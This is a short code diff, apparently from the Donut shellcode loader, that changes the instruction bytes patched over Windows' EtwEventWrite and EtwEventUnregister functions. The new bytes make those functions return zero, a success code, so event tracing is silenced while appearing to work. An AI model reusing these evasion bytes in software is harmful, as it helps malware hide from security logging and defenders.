@@ -980,8 +980,8 @@ static int build_instance(PDONUT_CONFIG c) {
       strcpy(inst->ntdll, "ntdll");
       strcpy(inst->etwEventWrite, "EtwEventWrite");
       strcpy(inst->etwEventUnregister, "EtwEventUnregister");
-      strcpy(inst->etwRet64, "\xc3");
-      strcpy(inst->etwRet32, "\xc2\x14\x00\x00");
+      strcpy(inst->etwRet64, "\x48\x33\xc0\xc3");
+      strcpy(inst->etwRet32, "\x33\xc0\xc2\x14\x00");
     }
     
     // if module is an unmanaged EXE
